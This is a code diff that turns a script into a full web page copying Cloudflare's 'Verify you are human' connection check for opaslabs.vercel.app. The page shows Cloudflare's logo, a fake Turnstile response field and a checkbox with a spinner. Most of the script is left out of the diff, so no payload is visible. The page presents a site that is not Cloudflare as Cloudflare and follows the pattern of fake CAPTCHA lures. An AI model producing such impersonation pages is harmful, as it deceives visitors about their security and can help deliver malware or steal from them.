@@ -1,4 +1,66 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Secure Connection Check</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
+  <style>    
+    body { font-family: 'Roboto', sans-serif; }
+
+    /* Spinner style */
+    .spinner {
+      border: 2px solid transparent;
+      border-top: 2px solid #16a34a; /* Tailwind green-600 */
+      border-radius: 50%;
+      width: 1rem;
+      height: 1rem;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>    
+</head>    
+<body class="bg-white text-gray-900 p-6 sm:p-10">    
+  <main class="max-w-3xl mx-auto">    
+    <h1 class="text-3xl font-normal mb-2">opaslabs.vercel.app</h1>    
+    <p class="text-lg font-normal mb-6">Checking if the site connection is secure</p>    
+
+    <section class="border border-gray-300 rounded-sm w-fit px-4 py-3 flex items-center space-x-3 mb-6">    
+      <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-3drrs_response">    
+
+      <!-- Checkbox container with spinner swap -->
+      <div id="checkbox-container" class="relative w-4 h-4">
+        <!-- Checkbox -->
+        <input type="checkbox" id="verifyHuman" class="form-checkbox h-4 w-4 text-green-600 absolute inset-0">
+        <!-- Spinner -->
+        <div id="spinner" class="spinner absolute inset-0 hidden"></div>
+      </div>
+
+      <!-- Label -->
+      <label class="text-sm select-none cursor-pointer" for="verifyHuman">Verify you are human</label>    
+
+      <!-- Cloudflare logo and text -->
+      <div class="ml-4 flex flex-col items-center">    
+        <img alt="Cloudflare logo" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg"/>    
+        <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">    
+          <span>Privacy</span>    
+          <span>·</span>    
+          <span>Terms</span>    
+        </div>    
+      </div>    
+    </section>    
+
+    <p class="text-base font-normal max-w-xl">    
+      opaslabs.vercel.app needs to review the security of your connection before proceeding.    
+    </p>    
+  </main>    
+
+  <script>
   const checkbox = document.getElementById('verifyHuman');
   const spinner = document.getElementById('spinner');
 
@@ -234,3 +296,6 @@
     }, 6000);
   });
 </script>
+
+</body>
+</html>
